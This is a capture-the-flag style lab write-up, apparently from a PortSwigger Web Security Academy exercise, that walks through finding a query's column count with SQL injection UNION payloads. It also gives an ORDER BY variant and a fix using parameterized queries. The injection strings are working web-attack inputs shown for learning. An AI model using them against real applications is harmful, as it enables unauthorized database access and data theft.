# SQL Injection - UNION Attack: Identify Column Count

## Goal:
This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables.

To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values.

---

## Process

### 1. Intercept the GET request using Burp Suite
```http
GET /filter?category=Corporate+gifts HTTP/2
```

### 2. Modify the category parameter to inject SQL

```sql
' UNION SELECT NULL--
```

this displayed an error "Internal Server Error"

```sql
' UNION SELECT NULL,NULL--
```
this also displayed an error "Internal Server Error"

```sql
' UNION SELECT NULL,NULL,NULL--
```
this loaded the webpage normally,indicating the original query returns 3 columns, and the payload now matches that structure.

### 3. Explanation

`' UNION SELECT NULL,NULL,NULL--` closes the string with `'`, adds a `UNION SELECT` clause with 3 columns (`NULL,NULL,NULL`), comments out the rest of the query using `--`.

**The SQL query becomes:**

```sql
SELECT * FROM products WHERE category = 'Corporate gifts' UNION SELECT NULL,NULL,NULL--' AND released = 1
```

Now the injected query structure is valid (matches the original query structure), and the page loades correctly.

---

## How to fix this vulnerability

**Use Parameterized Queries (Prepared Statements)**: 

Parameterised query treat user input as data, which prevents injection. Never build SQL statements by directly concatenating user input. 

Check syntax [here](/PortSwigger-web-security-academy/SQL-injection/01-sqli-where-clause.md#how-to-fix-this-vulnerability)

---

## Reflection

Learned the first step of a UNION-based SQL injection: determining the number of columns required for a valid `UNION SELECT` query.

---

## Notes

`ORDER BY 1`, `ORDER BY 2`, etc., can also be used to determine the comumn count. However,when using ORDER BY, the page loads normally until the number exceeds the actual column count — then it shows an error.

`--` comments out the rest of the query. On MySQL, `--` should be followed by a space. Alternatively, `#` can also be used to identify a comment.

[SQLi cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

---